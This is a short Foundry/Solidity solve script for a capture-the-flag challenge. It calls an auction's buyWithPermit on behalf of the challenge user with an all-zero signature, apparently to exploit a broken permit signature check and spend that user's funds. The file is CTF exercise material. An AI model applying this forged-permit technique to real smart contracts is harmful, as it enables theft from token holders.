// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-ctf/CTFSolver.sol";
import "forge-std/console.sol";

import {Challenge} from "src/Challenge.sol";

contract Solve is CTFSolver {
    function solve(address challenge_, address) internal override {
        Challenge challenge = Challenge(challenge_);

        console.log("solved?", challenge.isSolved());

        challenge.auction().buyWithPermit(
            challenge.user(), address(0x123), 1 ether, block.timestamp + 1 days, 0, bytes32(0), bytes32(0)
        );

        console.log("solved?", challenge.isSolved());
    }
}
